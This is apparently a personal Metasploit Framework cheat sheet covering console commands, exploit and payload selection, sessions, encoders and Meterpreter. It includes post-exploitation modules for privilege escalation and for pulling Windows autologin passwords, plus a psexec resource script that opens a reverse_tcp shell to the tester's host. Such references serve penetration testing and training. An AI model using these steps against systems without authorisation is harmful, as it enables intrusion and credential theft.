# Metasploit Framework (MSF)
The world’s most used penetration testing framework
[Metasploit](https://www.metasploit.com)

- - - -
## start
start db
`msfdb start`  or `systemctl start postgresql`

start metasploit framework console
`msfconsole`

- - - -
## exploits
select exploit
`use <exploit>`

run exploit
`run` or `exploit`

- - - -
## options
show options
`show options`

show advanced options
`show advanced`

set option
`set <option> <value>`

set option (global)
`setg <option> <value>`

- - - -
## payloads
show payloads
`show payloads`

select payload
`set payload <payload>`

- - - -
## sessions
show sessions
`sessions -h`

interact with session
`sessions -i 1`

send session to background
`background` 

- - - -
## meterpreter
The **shell** command will present you with a standard shell on the target system.
`shell`

Metasploit has a Meterpreter script, **getsystem**, that will use a number of different techniques to attempt to gain SYSTEM level privileges on the remote system.
`getsystem`

- - - -
## encoders
show encoders
`show encoders`

select encoder
`set encoder <encoder>`

- - - -
## misc
search for exploits
`search <term>`

go back
`back`

display help
`help`

get info about current context?
`info`

`show auxiliary` 

- - - -
## multi/handler
just start listener
`use exploit/multi/handler`

- - - -
## post exploitation
This module suggests local meterpreter exploits that can be used.
`use post/multi/recon/local_exploit_suggester`

This module extracts the plain-text Windows user login password in Registry.
`use post/windows/gather/credentials/windows_autologin`

This module will login with the specified username/password and execute the supplied command as a hidden process.
`use post/windows/manage/run_as`

### meterpreter session
migrate to other (e.g. more stable) process
`migrate`

get system info
`sysinfo`

port forwarding
`portfwd add -l <port> -r 127.0.0.1 -p <port>`

- - - -
## Resource Scripts
Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit.

`msfconsole -r demo.rc`

### demo.rc
```
use exploit/windows/smb/psexec
set rhost <ip>
set smbuser Administrator
set smbpass <hash-or-password>
set smbdomain <domain>
set payload windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/smart_migrate
setg lport 443
setg lhost <own-ip>
```

- - - -